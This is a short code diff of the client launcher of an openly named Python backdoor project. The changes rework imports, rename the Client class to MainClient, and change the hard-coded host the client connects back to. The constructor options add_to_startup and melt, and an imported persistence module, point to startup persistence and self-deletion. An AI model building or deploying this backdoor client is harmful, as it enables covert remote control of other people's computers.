@@ -7,20 +7,21 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import socket
 import os
+import sys
 
-from path_wrapper import wrap
-wrap()
+# append path, needed for all 'main' files
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
 
 from src.args import Args
 from src import errors
 from src.client import persistence
 from src.client.socket import Socket
-import logger
+from src import logger
 
 
-class Client:
+class MainClient:
     def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
-        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
+        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # make sure working dir is same as file dir
 
         self._args = Args(self)
         logger.init(self._args.get_args())
@@ -56,4 +57,4 @@ class Client:
 
 
 if __name__ == "__main__": 
-    Client('192.168.10.37', 3000, False, False, False).start()
+    MainClient('127.0.0.1', 3000).start()
